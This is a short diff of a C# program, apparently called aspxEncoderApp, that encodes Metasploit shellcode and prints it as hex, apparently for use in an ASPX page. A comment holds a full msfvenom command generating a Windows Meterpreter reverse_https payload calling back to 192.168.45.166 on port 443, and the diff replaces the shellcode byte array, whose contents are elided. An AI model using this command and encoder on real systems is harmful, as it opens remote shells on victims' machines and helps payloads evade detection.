@@ -13,7 +13,7 @@ namespace aspxEncoderApp
         {
             //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.166 LPORT=443 -f csharp -exitfunc=thread
 
-            byte[] buf = new byte[809] {0xfc,0x48, ... 0xd5};
+            byte[] buf = new byte[617] {0xfc, ... ,0xd5};
 
             byte[] encoded = new byte[buf.Length];
             for (int i = 0; i < buf.Length; i++)
@@ -28,6 +28,8 @@ namespace aspxEncoderApp
             }
 
             Console.WriteLine("The payload is: " + hex.ToString());
+
+
         }
     }
 }
